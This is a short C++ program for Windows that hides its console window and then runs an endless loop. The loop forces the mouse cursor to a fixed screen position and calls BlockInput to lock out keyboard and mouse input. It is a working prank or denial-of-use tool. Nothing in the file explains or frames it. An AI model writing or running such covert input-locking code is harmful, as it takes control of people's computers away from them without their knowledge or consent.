#include <iostream>
#include <windows.h>
#include <ctime>
using namespace std;
int X, Y;
void Stationary();
int main()
{
	srand(time(0));
	ShowWindow(GetConsoleWindow(), SW_HIDE);
	while (1)
	{
		Stationary();
		Sleep(0.1);
		BlockInput(true);
	}
}
void Stationary()
{
	X = 900;
	Y = 450;
	SetCursorPos(X, Y);
}